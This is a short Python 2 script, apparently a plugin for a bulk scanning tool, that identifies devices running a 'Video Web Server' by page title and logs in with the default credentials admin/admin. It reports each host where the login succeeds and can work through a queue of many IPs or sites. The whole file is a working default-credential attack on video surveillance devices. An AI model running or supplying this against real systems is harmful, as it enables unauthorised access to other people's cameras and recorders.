#!/usr/bin/env python
# coding: utf-8

import requests
import re

data = {
'username': 'admin',
'password': 'admin',
'Submit': 'Submit'
}

def attack(target):
    # write your code here
    if not target.startswith('http://'):
        target = "http://%s" % target

    try:
        res = requests.get(target)
        if re.search(r'<title>--- VIDEO WEB SERVER ---</title>', res.text):
            res = requests.post("%s/home.htm" % target, data = data)
            if re.search(r'<title>--- Video Web Server ---</title>', res.text):
                print "%s is OK" % target
    except:
        print "connection Error with %s" % target

def exploit(target):
    if isinstance(target, str):
        attack(target)
    else:
        while target.isReady():
            if not target.queue.empty():
                host = target.queue.get()
                if host.has_key('ip'):
                    attack(host['ip'])
                elif host.has_key('site'):
                    attack(host['site'])
                else:
                    print "[!] can not find a ip or site in your target!"